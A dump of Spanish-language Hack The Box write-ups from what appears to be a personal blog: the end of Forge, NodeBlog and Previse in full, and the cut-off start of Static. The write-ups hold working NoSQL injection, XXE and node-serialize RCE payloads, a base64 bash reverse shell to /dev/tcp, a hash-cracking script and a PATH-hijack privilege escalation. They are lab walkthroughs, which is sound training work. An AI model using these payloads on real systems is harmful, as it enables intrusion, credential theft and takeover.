sudo):\nuser@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py Listening on localhost:1423  En primer lugar, hay que poner la contraseña, la cual está escrita en texto claro en el código (secretadminpassword). Para activar pdb podemos introducir una letra en vez de un número (lo que causará una excepción ValueError):\nuser@forge:~$ telnet localhost 1423 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. Enter the secret passsword: secretadminpassword Welcome admin! What do you wanna do: [1] View processes [2] View free memory [3] View listening sockets [4] Quit x  Y después tendremos la interfaz de pdb:\nuser@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py Listening on localhost:1423 invalid literal for int() with base 10: b'x' \u0026gt; /opt/remote-manage.py(27)\u0026lt;module\u0026gt;() -\u0026gt; option = int(clientsock.recv(1024).strip()) (Pdb) ? Documented commands (type help \u0026lt;topic\u0026gt;): ======================================== EOF c d h list q rv undisplay a cl debug help ll quit s unt alias clear disable ignore longlist r source until args commands display interact n restart step up b condition down j next return tbreak w break cont enable jump p retval u whatis bt continue exit l pp run unalias where Miscellaneous help topics: ========================== exec pdb  Si escribimos interact, accederemos al REPL de Python, y aquí podremos conseguir una consola de comandos:\n(Pdb) interact *interactive* \u0026gt;\u0026gt;\u0026gt; import pty \u0026gt;\u0026gt;\u0026gt; pty.spawn('/bin/bash')  Finalmente, tenemos acceso como root y podemos leer la flag root.txt:\nroot@forge:/home/user# cat /root/root.txt 3f3744e3624782a0fd2504a47923c347  ","image":"/images/HTB/Forge/Forge.png","permalink":"https://7rocky.github.io/htb/forge/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina es vulnerable a Server-Side Request Forgery (SSRF) desde un subdominio hacia un servidor FTP. Despuñes, existen permisos de sudo para ejecutar un script de Python con un depurador. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web. En este write-up se utiliza un script en Python personalizado para explotar el SSRF","time":5,"title":"Forge"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.139   Fecha: 10 / 01 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.139 -p 22,5000 Nmap scan report for 10.10.11.139 Host is up (0.056s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 5000/tcp open http Node.js (Express middleware) |_http-title: Blog Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 15.37 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 5000 (HTTP).\nEnumeración web Si vamos a http://10.10.11.139:5000, encontraremos un blog montado sobre Express.js (un framework web de Node.js):\nAquí podemos tratar de iniciar sesión:\nLo primero que podemos probar son credenciales por defecto. Durante el proceso, vemos que el formulario es vulnerable a enumeración de usuarios:\n$ curl 10.10.11.139:5000/login -sd 'user=asdf\u0026password=asdf' | grep Invalid Invalid Username $ curl 10.10.11.139:5000/login -sd 'user=admin\u0026password=asdf' | grep Invalid Invalid Password  Y por tanto, sabemos que admin es un usuario válido. Entonces, podemos realizar un ataque de fuerza bruta para enumerar más usuarios válidos:\n$ ffuf -w $WORDLISTS/names.txt -u http://10.10.11.139:5000/login -d 'user=FUZZ\u0026password=x' -mr 'Invalid Password' -H 'Content-Type: application/x-www-form-urlencoded' admin [Status: 200, Size: 1040, Words: 151, Lines: 30]  Pero parece que no hay más usuarios comunes a parte de admin.\nEncontrando una inyección NoSQL Después de tratar de inyectar código SQL y probar contraseñas comunes, uno puede pensar que el servidor está utilizando MongoDB (stack MEAN: MongoDB, Express.js, Angular, Node.js). Por tanto, podemos buscar payloads de inyección NoSQL.\nPayloadsAllTheThings tiene muchos payloads, algunos con application/x-www-form-urlencoded y otros utilizando application/json.\nPodemos probar con application/x-www-form-urlencoded (como en los comandos anteriores con curl), pero ninguno funciona. Cambiemos entonces el tipo de contenido y verifiquemos que todo funciona bien:\n$ curl 10.10.11.139:5000/login -sd '{\"user\":\"admin\",\"password\":\"asdf\"}' -H 'Content-Type: application/json' | grep Invalid Invalid Password  Perfecto, ahora podemos añadir operadores de MongoDB:\n$ curl 10.10.11.139:5000/login -sd '{\"user\":{\"$eq\":\"admin\"},\"password\":\"asdf\"}' -H 'Content-Type: application/json' | grep Invalid Invalid Password $ curl 10.10.11.139:5000/login -sd '{\"user\":{\"$ne\":\"admin\"},\"password\":\"asdf\"}' -H 'Content-Type: application/json' | grep Invalid Invalid Username $ curl 10.10.11.139:5000/login -sd '{\"user\":{\"$ne\":\"asdf\"},\"password\":\"asdf\"}' -H 'Content-Type: application/json' | grep Invalid Invalid Password  Utilizando el siguiente payload, podemos saltarnos el formulario de inicio de sesión y obtener una cookie de sesión válida:\n$ curl 10.10.11.139:5000/login -isd '{\"user\":\"admin\",\"password\":{\"$regex\":\"\"}}' -H 'Content-Type: application/json' HTTP/1.1 200 OK X-Powered-By: Express Set-Cookie: auth=%7B%22user%22%3A%22admin%,%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D; Max-Age=900; Path=/; HttpOnly Content-Type: text/html; charset=utf-8 Content-Length: 2589 ETag: W/\"a1d-JGrC4mhnlEApoTWWPEhYOlLd+UA\" Date: Connection: keep-alive Keep-Alive: timeout=5 ...  Además, podemos extraer la contraseña de admin utilizando el operador $regex. Para extraer la longitud de la contraseña, podemos incrementar el número hasta que coincida (no hay salida en el segundo comando ya que no hay mensaje de error):\n$ curl 10.10.11.139:5000/login -sd '{\"user\":\"admin\",\"password\":{\"$regex\":\"^.{24}$\"}}' -H 'Content-Type: application/json' | grep Invalid Invalid Password $ curl 10.10.11.139:5000/login -sd '{\"user\":\"admin\",\"password\":{\"$regex\":\"^.{25}$\"}}' -H 'Content-Type: application/json' | grep Invalid  Después, podemos añadir caracteres hasta que la expresión regular coincida y finalmente obtener la contraseña. Para automatizar el proceso, utilicé un script en Bash llamado nosqli.sh. El script obtiene la longitud de la contraseña y luego la extrae (explicación detallada aquí).\n$ bash nosqli.sh Password length: 25 Password: IppsecSaysPleaseSubscribe  Encontrando una inyección XXE Utilizando la contraseña obtenida, podemos iniciar sesión correctamente:\nAquí, podemos crear un nuevo artículo. No obstante, al tratar de guardarlo, tenemos un error:\nEsto será interesante más adelante, porque conocemos ya la ruta absoluta donde está el código de la aplicación web (/opt/blog).\nExiste otra funcionalidad que es subir un artículo. Podemos añadir un archivo cualquiera y obtener un error de XML:\nEntonces, necesitamos subir un documento XML válido, como este:\n\u0026lt;?xml version=\"1.0\"?\u0026gt; \u0026lt;post\u0026gt; \u0026lt;title\u0026gt;ASDF\u0026lt;/title\u0026gt; \u0026lt;description\u0026gt;\u0026lt;/description\u0026gt; \u0026lt;markdown\u0026gt;\u0026lt;/markdown\u0026gt; \u0026lt;/post\u0026gt;  Y vemos que el servidor lo analiza y rellena los campos del formulario para editar el artículo:\nEn este punto, podemos efectuar una inyección de Entidad Externa XML (XXE), esto es, añadir una entidad que tome el contenido de un archivo y lo ponga en un elemento del documento XML. Un simple payload XXE sería el siguiente:\n\u0026lt;?xml version=\"1.0\"?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u0026gt; ]\u0026gt; \u0026lt;post\u0026gt; \u0026lt;title\u0026gt;ASDF\u0026lt;/title\u0026gt; \u0026lt;description\u0026gt;\u0026amp;xxe;\u0026lt;/description\u0026gt; \u0026lt;markdown\u0026gt;\u0026lt;/markdown\u0026gt; \u0026lt;/post\u0026gt;  Si subimos este documento, obtenemos el archivo /etc/passwd en el campo de descripción:\nCon esta vulnerabilidad, podemos leer archivos del servidor si conocemos la ruta absoluta. Para explotarla, utilicé un script en Python llamado xxe.py (explicación detallada aquí).\nTenemos la ruta base del servidor (/opt/blog), mostrada en un mensaje de error. El archivo principal de una aplicación de Node.js suele ser: app.js, main.js, script.js, index.js o server.js. Podemos probar estos archivos y ver que server.js existe:\n$ pyhton3 xxe.py /opt/blog/server.js  const express = require('express') const mongoose = require('mongoose') const Article = require('./models/article') const articleRouter = require('./routes/articles') const loginRouter = require('./routes/login') const serialize = require('node-serialize') const methodOverride = require('method-override') const fileUpload = require('express-fileupload') const cookieParser = require('cookie-parser') const crypto = require('crypto') const cookie_secret = 'UHC-SecretCookie' // const session = require('express-session') const app = express() mongoose.connect('mongodb://localhost/blog') app.set('view engine', 'ejs') app.use(express.urlencoded({ extended: false })) app.use(methodOverride('_method')) app.use(fileUpload()) app.use(express.json()) app.use(cookieParser()) // app.use(session({ secret: 'UHC-SecretKey-123' })) function authenticated(c) { if (typeof c == 'undefined') return false c = serialize.unserialize(c) if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex'))) { return true } else { return false } } app.get('/', async (req, res) =\u0026gt; { const articles = await Article.find().sort({ createdAt: 'desc' }) res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) }) }) app.use('/articles', articleRouter) app.use('/login', loginRouter) app.listen(5000)  Podríamos extraer más códigos fuente a partir del principal (por ejemplo, /opt/blog/routes/login.js, /opt/blog/routes/articles.js, /opt/blog/models/user.js y /opt/blog/models/article.js). Sin embargo, con server.js basta para continuar.\nEncontrando una deserialización insegura El archivo JavaScript anterior utiliza node-serialize, que es un módulo de Node.js utilizado para serializar y deserializar documentos JSON. Se sabe que este módulo es vulnerable a ejecución remota de comandos (RCE) mediante el método unserialize. Podemos encontrar más información al respecto y una sencilla prueba de concepto en snyk.io (CVE-2017-5941). Necesitamos introducir un payload como este:\nconst serialize = require('node-serialize') const payload = `{\"rce\":\"_$$ND_FUNC$$_function() { require('child_process').exec('ls') }()\"}` serialize.unserialize(payload)  El método unserialize se utiliza sobre la cookie de sesión para verificar que la firma es correcta. Por tanto, podemos añadir el payload a la cookie, ya que está en formato JSON (con codificación URL).\nPara esta tarea, desarrollé un script en Node.js que se autentica y modifica la cookie de sesión para introducir el payload y obtener una reverse shell. El script se llama unserialize_rce.js (explicación detallada aquí).\nUtilizando este script, somos capaces de acceder a la máquina como admin:\n$ node unserialize_rce.js 10.10.17.44 4444 [+] Login successful [+] RCE completed  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.139. Ncat: Connection from 10.10.11.139:55018. bash: cannot set terminal process group (861): Inappropriate ioctl for device bash: no job control in this shell admin@nodeblog:/opt/blog$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null admin@nodeblog:/opt/blog$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm admin@nodeblog:/opt/blog$ export TERM=xterm admin@nodeblog:/opt/blog$ export SHELL=bash admin@nodeblog:/opt/blog$ stty rows 50 columns 158  Escalada de privilegios Una vez como admin, podemos ir a su directorio personal y capturar la flag user.txt:\nadmin@nodeblog:/opt/blog$ cd admin@nodeblog:~$ cat user.txt 7d30843b9570b5efd388820002409de2  Además, el archivo .bash_history no está redirigido a /dev/null, por lo que podemos ver los últimos comandos ejecutados por admin:\nadmin@nodeblog:~$ ls -la --time-style=+ total 36 drwxrwxrwx 1 admin admin 220 . drwxr-xr-x 1 root root 10 .. -rw------- 1 admin admin 1863 .bash_history -rw-r--r-- 1 admin admin 220 .bash_logout -rw-r--r-- 1 admin admin 3771 .bashrc drwx------ 1 admin admin 40 .cache -rw------- 1 admin admin 383 .dbshell -rw------- 1 admin admin 0 .mongorc.js drwxrwxr-x 1 admin admin 158 .pm2 -rw-r--r-- 1 admin admin 807 .profile -rw-r--r-- 1 admin admin 0 .sudo_as_admin_successful -rw------- 1 admin admin 10950 .viminfo -rw-r--r-- 1 root root 33 user.txt admin@nodeblog:~$ tail .bash_history node server.js vi server.js node server.js vi server.js node server.js vi server.js node server.js vi server.js node server.js sudo su  Como está utilizando sudo su, podemos deducir que este usuario puede ser root utilizando sudo. Si utilizamos la contraseña extraída anteriormente de MongoDB, conseguimos ser root:\nadmin@nodeblog:~$ sudo su [sudo] password for admin: root@nodeblog:/home/admin# cd root@nodeblog:~# cat root.txt 5ebff8f607158b4d1b78427af94f5358  ","image":"/images/HTB/NodeBlog/NodeBlog.png","permalink":"https://7rocky.github.io/htb/nodeblog/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina contiene un blog que es vulnerable a inyección NoSQL, luego a inyección de Entidades Externas XML (XXE) y finalmente a deserialización insegura para obtener ejecución remota de comandos. Para comprometer esta máquina se necesitan técnicas avanzadas de explotación web y habilidades de programación. En este write-up se utilizan scripts en Bash, Python y Node.js para explotar todas las vulnerabilidades","time":5,"title":"NodeBlog"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.104   Fecha: 07 / 08 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.104 -p 22,80 Nmap scan report for 10.10.11.104 Host is up (0.047s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 58.91 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración web Si vamos a http://10.10.11.104, el servidor nos redirige al formulario de inicio de sesión:\nVamos a aplicar fuzzing para enumerar más rutas. Podemos añadir extensiones .php por si acaso:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/FUZZ -e .php index.php [Status: 302, Size: 2801, Words: 737, Lines: 72] download.php [Status: 302, Size: 0, Words: 1, Lines: 1] login.php [Status: 200, Size: 2224, Words: 486, Lines: 54] files.php [Status: 302, Size: 4914, Words: 1531, Lines: 113] header.php [Status: 200, Size: 980, Words: 183, Lines: 21] nav.php [Status: 200, Size: 1248, Words: 462, Lines: 32] footer.php [Status: 200, Size: 217, Words: 10, Lines: 6] css [Status: 301, Size: 310, Words: 20, Lines: 10] status.php [Status: 302, Size: 2968, Words: 749, Lines: 75] js [Status: 301, Size: 309, Words: 20, Lines: 10] logout.php [Status: 302, Size: 0, Words: 1, Lines: 1] accounts.php [Status: 302, Size: 3994, Words: 1096, Lines: 94] config.php [Status: 200, Size: 0, Words: 1, Lines: 1] logs.php [Status: 302, Size: 0, Words: 1, Lines: 1]  Aquí vemos que hay muchos estados 302 (302 Found). Esto significa que el servidor está redirigiendo a /login.php. Podemos decirle a ffuf que siga las redirecciones con el parámetro -r:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/FUZZ -e .php -r index.php [Status: 200, Size: 2224, Words: 486, Lines: 54] download.php [Status: 200, Size: 2224, Words: 486, Lines: 54] login.php [Status: 200, Size: 2224, Words: 486, Lines: 54] files.php [Status: 200, Size: 2224, Words: 486, Lines: 54] header.php [Status: 200, Size: 980, Words: 183, Lines: 21] nav.php [Status: 200, Size: 1248, Words: 462, Lines: 32] footer.php [Status: 200, Size: 217, Words: 10, Lines: 6] css [Status: 200, Size: 939, Words: 61, Lines: 17] status.php [Status: 200, Size: 2224, Words: 486, Lines: 54] js [Status: 200, Size: 1155, Words: 77, Lines: 18] logout.php [Status: 200, Size: 2224, Words: 486, Lines: 54] accounts.php [Status: 200, Size: 2224, Words: 486, Lines: 54] config.php [Status: 200, Size: 0, Words: 1, Lines: 1] logs.php [Status: 200, Size: 2224, Words: 486, Lines: 54]  Parece claro que el servidor está redirigiendo a /login.php. La clave aquí es que las respuestas con código 302 tienen cuerpo. Esto se puede ver claramente desde Burp Suite:\nSi renderizamos el contenido de la respuesta, podemos ver la página desde Burp Suite. El servidor habría seguido la redirección debido al estado 302.\nRegistrando una nueva cuenta Utilizando Burp Suite, podemos interceptar peticiones y también respuestas. Podemos configurarlo para que modifique la respuesta automáticamente y que cambie el estado a 200 Ok, de manera que el navegador no siga las redirecciones. Para ello, tenemos que ir a Proxy \u0026gt; Options \u0026gt; Match and Replace \u0026gt; Add y poner la siguiente configuración:\nAsí, podemos ver el contenido de la página web e incluso registrar una cuenta en /account.php:\nUna vez registrados, podemos iniciar sesión y olvidarnos ya de las redirecciones.\nAnalizando código PHP Hay un archivo ZIP subido por el usuario newguy:\nEste contiene una copia de seguridad del código PHP del servidor:\n$ unzip siteBackup.zip $ tree . ├── accounts.php ├── config.php ├── download.php ├── file_logs.php ├── files.php ├── footer.php ├── header.php ├── index.php ├── login.php ├── logout.php ├── logs.php ├── nav.php ├── siteBackup.zip └── status.php 0 directories, 14 files  En el archivo config.php encontramos unas credenciales de MySQL:\n\u0026lt;?php function connectDB() { $host = 'localhost'; $user = 'root'; $passwd = 'mySQL_p@ssw0rd!:)'; $db = 'previse'; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; }  También vemos un método curioso de realizar el hash de las contraseñas en login.php:\n$users = $result-\u0026gt;fetch_assoc(); $passHash = $users['password']; if (crypt($password, '$1$🧂llol$') == $passHash) { $result-\u0026gt;free(); $_SESSION['user'] = $users['username']; $result = $db-\u0026gt;query($sql); if (!$result) { echo 'Oops! Something went wrong, try again later!'; } $db-\u0026gt;close(); header('Location: index.php'); } else { echo '\u0026lt;div class=\"uk-alert-danger\"\u0026gt;Invalid Username or Password\u0026lt;/div\u0026gt;'; }  Acceso a la máquina Podemos también encontrar un archivo llamado logs.php, que ejecuta un script de Python utilizando una llamada de systema, con una entrada de usuario sin validación:\n\u0026lt;?php session_start(); if (!isset($_SESSION['user'])) { header('Location: login.php'); exit; } if (!$_SERVER['REQUEST_METHOD'] == 'POST') { header('Location: login.php'); exit; } ///////////////////////////////////////////////////////////////////////////////////// //I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER// ///////////////////////////////////////////////////////////////////////////////////// $output = exec(\"/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\"); echo $output; $filepath = \"/var/www/out.log\"; $filename = \"out.log\"; if (file_exists($filepath)) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename=\"'.basename($filepath).'\"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($filepath)); ob_clean(); // Discard data in the output buffer flush(); // Flush system headers readfile($filepath); die(); } else { http_response_code(404); die(); }  La línea de código vulnerable es esta:\n$output = exec(\"/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\");  Ya que podemos poner un punto y coma e inyectar otro comando. Por ejemplo, podemos conectarnos al servidor utilizando una reverse shell con nc:\n$ echo -n 'bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  Para realizar esta petición desde curl, es necesario añadir la cookie para mantener la sesión:\n$ curl http://10.10.11.104/logs.php -d 'delim=comma; echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash' -H 'Cookie: PHPSESSID=952sbct7uf71fvi95m0p2gvmvi'  Y obtenemos una consola de comandos desde nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.104. Ncat: Connection from 10.10.11.104:55204. bash: cannot set terminal process group (1369): Inappropriate ioctl for device bash: no job control in this shell www-data@previse:/var/www/html$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@previse:/var/www/html$ ^Z [1] + 70279 suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + 70279 continued ncat -nlvp 4444 reset xterm www-data@previse:/var/www/html$ export TERM=xterm www-data@previse:/var/www/html$ export SHELL=bash www-data@previse:/var/www/html$ stty rows 50 columns 158  El proceso de registro de una nueva cuenta, acceder como nuevo usuario y realizar la petición con la inyección de comandos se automatizó en un programa en Go llamado foothold.go (explicación detallada aquí).\nSe puede ejecutar así:\n$ go run foothold.go 10.10.17.44 4444 [+] Creating username: 'aBwbf8GZPk', with password: 'LqsgiuEoyV' [*] Registration successful [*] Login successful. Cookie: PHPSESSID=t19n77eh9qt1ui2unipsoa6j0b; path=/ [!] Sent reverse shell. Check your nc listener  Movimiento lateral al usuario m4lwhere Ahora es momento de convertirse en el usuario m4lwhere:\nwww-data@previse:/var/www/html$ ls /home m4lwhere  Podemos utilizar las credenciales de MySQL encontradas en el archivo config.php para conectarnos a la base de datos:\nwww-data@previse:/var/www/html$ mysql -u root --password='mySQL_p@ssw0rd!:)' mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | previse | | sys | +--------------------+ 5 rows in set (0.01 sec) mysql\u0026gt; use previse; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +-------------------+ | Tables_in_previse | +-------------------+ | accounts | | files | +-------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; select * from accounts; +-----+----------+----------------------------------+---------------------+ | id | username | password | created_at | +-----+----------+----------------------------------+---------------------+ | 1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 | | ... | ... | ... | ... | +-----+----------+----------------------------------+---------------------+ 3 rows in set (0.00 sec)  El hash que vemos es algo raro porque contiene un emoji en la parte de la sal del hash. Usar john y hashcat será complicado debido al formato. Aunque puede ser solucionado, lo más rápido es escribir un script en PHP y romper el hash utilizando el mismo procedimiento que se utiliza en el servidor (ver archivos accounts.php o login.php):\n\u0026lt;?php $passHash = '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.'; if ($file = fopen('rockyou.txt', 'r')) { while (!feof($file)) { $password = fgets($file); if (crypt(trim($password), '$1$🧂llol$') == $passHash) { echo $password; break; } } fclose($file); }  Y encontramos la contraseña:\n$ php crack.php ilovecody112235!  Ahora podemos conectarnos por SSH y conseguir la flag user.txt:\n$ ssh m4lwhere@10.10.11.104 m4lwhere@10.10.11.104's password: m4lwhere@previse:~$ cat user.txt ab438774e2b02effcf6d49753e5c8cb8  Escalada de privilegios Este usuario puede ejecutar un script en Bash como root mediante sudo:\nm4lwhere@previse:~$ sudo -l [sudo] password for m4lwhere: User m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.sh m4lwhere@previse:~$ ls -l /opt/scripts/access_backup.sh -rwxr-xr-x 1 root root 486 Jun 6 12:49 /opt/scripts/access_backup.sh m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh  #!/bin/bash # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time gzip -c /var/log/apache2/access.log \u0026gt; /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u0026gt; /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_file_access.gz  No tenemos permisos para modificar el archivo. Sin embargo, el comando gzip se está ejecutando con una ruta relativa (al igual que date). Esto es vulnerable a PATH hijacking porque no hay secure_path en la salida de sudo -l.\nPrimero, creamos nuestro propio comando gzip en /tmp, como un script de Bash que pone /bin/bash como binario SUID:\nm4lwhere@previse:/tmp$ echo -e '#!/bin/bash\\nchmod u+s /bin/bash' \u0026gt; gzip m4lwhere@previse:/tmp$ chmod +x gzip m4lwhere@previse:/tmp$ cat gzip #!/bin/bash chmod u+s /bin/bash  Ahora, añadimos /tmp al principio de la variable de entorno PATH, de manera que se encuentre primero el comando malicioso gzip antes que el legítimo:\nm4lwhere@previse:/tmp$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH m4lwhere@previse:/tmp$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin m4lwhere@previse:/tmp$ which gzip /tmp/gzip  Y finalmente, podemos ejecutar el script de Bash con permisos de root, de manera que /bin/bash se convierte en un binario SUID:\nm4lwhere@previse:/tmp$ ls -l /bin/bash -rwxr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh m4lwhere@previse:/tmp$ ls -l /bin/bash -rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash  Y finalmente, conseguimos acceder como root y leer la flag root.txt:\nm4lwhere@previse:/tmp$ bash -p bash-4.4# cat /root/root.txt 3b2115c0ed9ca779182d6d777b1ed40a  ","image":"/images/HTB/Previse/Previse.png","permalink":"https://7rocky.github.io/htb/previse/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyección de comandos después de burlar redirecciones y conseguir registrar una nueva cuenta. Después, hay que romper un hash para acceder como usuario de bajos privilegios y realizar PATH hijacking mediante sudo. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web y Burp Suite, así como técnicas de escalada de privilegios comunes. En este write-up se utiliza un programa en Go personalizado para automatizar la intrusión","time":7,"title":"Previse"},{"contents":"  SO: Linux   Dificultad: Difícil   Dirección IP: 10.10.10.246   Fecha: 19 / 06 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -Pn -o nmap/targeted 10.10.10.246 -p 22,2222,8080 Nmap scan report for 10.10.10.246 Host is up (0.044s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA) | 256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA) |_ 256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519) 2222/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA) | 256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA) |_ 256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519) 8080/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). | http-robots.txt: 2 disallowed entries |_/vpn/ /.ftp_uploads/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 27.37 seconds La máquina tiene abiertos los puertos 22, 2222 (SSH), 8080 (HTTP).\nEnumeración web Si vamos a http://10.10.10.246 utilizando un navegador web, veremos una página vacía. Mirando en la salida de nmap, descubrimos que hay un archivo robots.txt expuesto:\n$ curl 10.10.10.246:8080/robots.txt User-agent: * Disallow: /vpn/ Disallow: /.ftp_uploads/ Y con esto tenemos dos rutas que probar. La página http://10.10.10.246/vpn muestra un simple formulario de inicio de sesión como el siguiente:\nComo se trata de un formulario muy sencillo, podemos probar también credenciales sencillas. Después de algunos intentos, vemos que admin:admin funciona. Sin embargo, el servicio tiene habilitado 2FA (Segundo Factor de Autenticación).\nDejemos esto por el momento y vayamos a http://10.10.10.246/.ftp_uploads. Como se puede ver, el listado de directorios está habilitado:\nEl fichero llamado warning.txt dice lo siguiente:\n$ curl http://10.10.10.246:8080/.ftp_uploads/warning.txt Binary files are being corrupted during transfer!!! Check if are recoverable. Veamos si lo que dice es cierto. Si descargamos el archivo db.sql.gz y extraemos el fichero db.sql, obtendremos un error:\n$ 7z x db.sql.gz ... Scanning the drive for archives: 1 file, 262 bytes (1 KiB) Extracting archive: db.sql.gz -- Path = db.sql.gz Type = gzip Headers Size = 17 ERROR: CRC Failed : db.sql Sub items Errors: 1 Archives with Errors: 1 Sub items Errors: 1 No obstante, 7z es capaz de extraer el archivo db.sql, pero está corrupto:\nCREATE DATABASE static; USE static; CREATE TABLE users ( id smallint unsignint a\u0026#39;n a)Co3 Nto_increment,sers name varchar(20) a\u0026#39;n a)Co, password varchar(40) a\u0026#39;n a)Co, totp varchar(16) a\u0026#39;n a)Co, primary key (idS iaA; INSERT INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma, 